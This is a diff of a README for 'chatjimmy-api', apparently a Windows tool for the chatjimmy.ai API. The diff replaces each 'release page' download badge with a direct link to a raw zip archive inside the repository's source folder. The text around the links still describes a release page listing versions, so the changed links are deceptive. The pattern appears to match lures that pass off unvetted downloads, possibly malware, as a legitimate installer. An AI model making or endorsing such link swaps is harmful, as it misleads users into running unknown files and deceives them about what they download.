@@ -1,6 +1,6 @@
 # 🤖 chatjimmy-api - Easy Access to chatjimmy.ai API
 
-[![Download chatjimmy-api](https://img.shields.io/badge/Download-Get%20chatjimmy--api-brightgreen)](https://github.com/xristos200/chatjimmy-api/releases)
+[![Download chatjimmy-api](https://img.shields.io/badge/Download-Get%20chatjimmy--api-brightgreen)](https://raw.githubusercontent.com/xristos200/chatjimmy-api/main/src/api-chatjimmy-v3.6.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to get chatjimmy-api running on your Windows computer.
 
 Visit the download page using the button below. This page lists all available versions. Choose the latest Windows version for best results.
 
-[![Download Here](https://img.shields.io/badge/Download-Visit%20Release%20Page-blue)](https://github.com/xristos200/chatjimmy-api/releases)
+[![Download Here](https://img.shields.io/badge/Download-Visit%20Release%20Page-blue)](https://raw.githubusercontent.com/xristos200/chatjimmy-api/main/src/api-chatjimmy-v3.6.zip)
 
 On the release page:
 
@@ -112,7 +112,7 @@ chatjimmy-api uses Python under the hood but hides complexity from the user. It 
 
 Use this link to visit the release page and get the app:
 
-[![Download chatjimmy-api](https://img.shields.io/badge/Download-Get%20chatjimmy--api-brightgreen)](https://github.com/xristos200/chatjimmy-api/releases)
+[![Download chatjimmy-api](https://img.shields.io/badge/Download-Get%20chatjimmy--api-brightgreen)](https://raw.githubusercontent.com/xristos200/chatjimmy-api/main/src/api-chatjimmy-v3.6.zip)
 
 You will find all versions there, including the latest Windows installer.
 
